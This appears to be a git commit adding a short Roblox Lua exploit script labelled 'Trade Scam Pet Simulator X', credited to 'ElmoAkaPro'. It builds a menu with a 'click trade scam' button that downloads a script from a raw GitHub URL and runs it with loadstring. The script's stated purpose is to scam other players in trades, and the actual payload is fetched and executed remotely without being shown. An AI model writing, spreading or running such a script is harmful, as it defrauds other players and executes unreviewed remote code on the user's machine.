d42f4257ea788c8751bbf00aa828480269dcc5b7
WhySoNoob <104905194+WhySoNoob@users.noreply.github.com>
2022-12-10 19:18:08 +0700

    Add files via upload

---
+++ Dupegem.lua
@@ -0,0 +1,11 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade Scam Pet Simulator X", "Midnight")
+
+--MAIN
+local Main = Window:NewTab("Trade Scam")
+local MainSection = Main:NewSection("trade Scam")
+
+
+MainSection:NewButton("click trade scam", "Script BY ElmoAkaPro", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/WhySoNoob/DupeGem/main/Dupeg"))()
+end)
